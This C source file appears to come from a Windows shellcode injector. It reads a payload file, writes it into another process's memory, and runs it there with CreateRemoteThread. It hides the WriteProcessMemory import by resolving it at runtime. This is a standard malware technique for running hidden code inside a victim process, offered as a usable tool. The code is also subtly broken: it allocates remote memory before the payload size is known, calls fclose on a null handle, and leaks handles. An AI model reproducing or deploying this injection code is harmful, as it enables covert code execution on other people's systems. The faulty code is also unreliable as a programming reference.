#include "crt.h"
#include "mem.h"
#include "logger.h"

#ifndef VC_EXTRA_LEAN
#define VC_EXTRA_LEAN
#include <windows.h>
#include <tlhelp32.h>
#endif /* VC_EXTRA_LEAN */

#include <stdlib.h>
#include <stdio.h>

typedef VOID (* exec_mem_t)(void);
typedef WINBOOL (WINAPI * WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

static char* ExtractBytesFromFile(const char* restrict f, size_t* size)
{
    FILE* fp = NULL;

    if ( !(fp = fopen(f, "rb")) )
    {
        fclose(fp);
    }
    fseek(fp, 0, SEEK_END);
    *size = (size_t)ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char* bytesRead = (char *)malloc(*size);
    fread(bytesRead, *size, sizeof(char), fp); 

    return bytesRead;
}

unsigned InjectExecuteShellcode(Resource* restrict resource, Injector* restrict injector)
{
    WriteProcessMemory_t    pWriteProcessMemory = NULL;
    exec_mem_t              exec_mem = NULL;
    HANDLE                  hProcess = NULL;
    HANDLE                  hThread = NULL;
    DWORD                   old_protect = 0;
    BOOL                    bSuccess = 0;
    char*                   payload = 0;
    size_t                  size = 0;

    injector->logger && injector->logger(injector, "Opening target process..", 0);
    if (!(hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, resource->process_id)))
    {
        injector->logger && injector->logger(injector, "Failed to acquire handle to target", 0);
        CloseHandle(hProcess);
        return -1u;
    }
    injector->logger && injector->logger(injector, "Process Handle to target acquired", 0);

    injector->logger && injector->logger(injector, "Allocating virtual memory to target..", 0);
    if (!(exec_mem = (exec_mem_t)VirtualAllocEx(hProcess, NULL, size+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        injector->logger && injector->logger(injector, "Failed to allocate memory to target", 0);
        CloseHandle(hProcess);
        return -1u;
    }
    injector->logger && injector->logger(injector, "Allocation successful", 0);

    /*WriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL);*/
    injector->logger && injector->logger(injector, "Writing payload to executable memory..", 0);
    payload = ExtractBytesFromFile(resource->dll_rel_path, &size);
    pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory");
    if (!(pWriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL)))
    {
        free(payload);
        injector->logger && injector->logger(injector, "Failed to write payload to executable memory", 0);
        return -1u;
    }
    free(payload);
    injector->logger && injector->logger(injector, "Write success", 0);

    injector->logger && injector->logger(injector, "Changing virtual protection permissions..", 0);
    if (!(bSuccess = VirtualProtectEx(hProcess, (LPVOID)exec_mem, size, PAGE_EXECUTE_READ, &old_protect)))
    {
        injector->logger && injector->logger(injector, "Failed to change virtual protection permissions", 0);
        return -1u;
    }
    injector->logger && injector->logger(injector, "Protection changed", 0);

    injector->logger && injector->logger(injector, "Creating remote thread..", 0);
    if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL)))
    {
        injector->logger && injector->logger(injector, "Failed to create remote thread", 0);
        return -1u;
    }
    injector->logger && injector->logger(injector, "Remote thread created", 0);
    
    // optional wait for object
    // WaitForSingleObject(hThread, INFINITE);
    
    injector->logger && injector->logger(injector, "Closing handle and returning control to owner..", 0);
    CloseHandle(hProcess);
    return 0;
}
